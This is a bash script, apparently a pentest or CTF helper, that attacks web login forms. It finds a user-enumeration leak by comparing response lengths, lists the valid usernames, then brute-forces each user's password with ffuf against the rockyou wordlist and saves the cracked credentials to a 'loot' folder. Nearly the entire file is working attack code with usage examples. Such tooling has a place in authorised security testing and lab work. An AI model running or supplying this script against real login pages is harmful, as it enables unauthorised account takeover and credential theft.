#!/usr/bin/env bash
# login-enum — the auth path, automated: find the user-enumeration oracle, enumerate
# valid users, then fast-brute their passwords with ffuf (local, no third party).
#
# Many login forms leak "no such user" vs "wrong password" — a per-user message is a
# free user list, then you only brute the real names. hydra is ~15x slower than ffuf
# on web forms, so this brutes with ffuf and anchors on success (not just absence).
#
# Usage:
#   ./login-enum.sh <login-url> '<data with ^USER^ and ^PASS^>' <userlist> [GET|POST] [fail-regex] [passlist]
#
# Example:
#   ./login-enum.sh http://t/dev/index.php 'username=^USER^&password=^PASS^' \
#       /usr/share/seclists/Usernames/top-usernames-shortlist.txt POST
set -uo pipefail
URL="${1:?usage: login-enum.sh <url> '<data ^USER^/^PASS^>' <userlist> [GET|POST] [fail-regex] [passlist]}"
TMPL="${2:?need data template with ^USER^ and ^PASS^}"
ULIST="${3:?need a username wordlist}"
METHOD="${4:-POST}"
FAIL="${5:-}"
PLIST="${6:-/usr/share/wordlists/rockyou.txt}"
host=$(printf '%s' "$URL" | sed -E 's#^[a-z]+://##; s#[/:?].*$##')
OUT="loot/$host"; mkdir -p "$OUT"

send(){ # $1=user $2=pass -> body
  local d="${TMPL//^USER^/$1}"; d="${d//^PASS^/$2}" args=(); IFS='&' read -ra kv <<<"$d"
  for p in "${kv[@]}"; do args+=(--data-urlencode "$p"); done
  if [ "$METHOD" = GET ]; then curl -s --max-time 15 -G "$URL" "${args[@]}"; else curl -s --max-time 15 "$URL" "${args[@]}"; fi
}

echo "[*] 1/3 baseline (a definitely-invalid user)"
BASE=$(send "wrmzzz$(date +%s)" "wrmpass123"); BLEN=$(printf '%s' "$BASE" | wc -c)
echo "    baseline length: $BLEN"

echo "[*] 2/3 enumerating users from $ULIST (response differs from baseline = valid)"
VALID="$OUT/valid-users.txt"; : > "$VALID"
while IFS= read -r u; do
  [ -z "$u" ] && continue
  r=$(send "$u" "wrmpass123"); L=$(printf '%s' "$r" | wc -c)
  if [ "$L" != "$BLEN" ]; then echo "    [VALID] $u"; echo "$u" >> "$VALID"; fi
done < "$ULIST"
NV=$(wc -l < "$VALID" 2>/dev/null || echo 0)
[ "$NV" -eq 0 ] && { echo "[!] no users enumerated (no length diff). The form may not leak user existence — brute a known/guessed user directly, or pass a better userlist."; exit 0; }
echo "    $NV valid user(s) -> $VALID"

# derive the failure string from a valid user's wrong-password response if not supplied
if [ -z "$FAIL" ]; then
  vr=$(send "$(head -1 "$VALID")" "wrmpass123")
  FAIL=$(printf '%s' "$vr" | grep -oiE '[^<>]*(incorrect|invalid|wrong|bad) password[^<>]*' | head -1 | sed 's/^ *//;s/ *$//')
  [ -z "$FAIL" ] && FAIL=$(printf '%s' "$vr" | grep -oiE 'incorrect password[^<>]*|invalid password[^<>]*|login failed[^<>]*' | head -1)
fi
if [ -z "$FAIL" ]; then
  echo "[!] couldn't auto-detect the wrong-password string. Re-run passing it as arg 5, e.g.:"
  echo "    ./login-enum.sh '$URL' '$TMPL' '$ULIST' $METHOD 'Incorrect Password'"
  exit 0
fi
echo "[*] failure string for brute: \"$FAIL\""

command -v ffuf >/dev/null || { echo "[!] ffuf not installed; brute step skipped. Valid users are in $VALID"; exit 0; }
echo "[*] 3/3 brute-forcing each valid user with ffuf (success-anchored)"
body="${TMPL//^PASS^/FUZZ}"
while IFS= read -r u; do
  b="${body//^USER^/$u}"
  echo "    == $u =="
  ffuf -u "$URL" -X "$METHOD" -d "$b" -H 'Content-Type: application/x-www-form-urlencoded' \
       -w "$PLIST" -fr "$FAIL" -fc 403,404,500 -ac -t 40 -s -o "$OUT/brute-$u.json" -of json 2>/dev/null
  if [ -s "$OUT/brute-$u.json" ] && grep -q '"input"' "$OUT/brute-$u.json"; then
    echo "    [CREDS] $u : $(grep -oE '"FUZZ":"[^"]*"' "$OUT/brute-$u.json" | head -1 | cut -d'"' -f4)"
  else echo "    no password found for $u in this list"; fi
done < "$VALID"
echo "[*] done. Verify any hit by logging in manually (server hiccups can false-positive)."
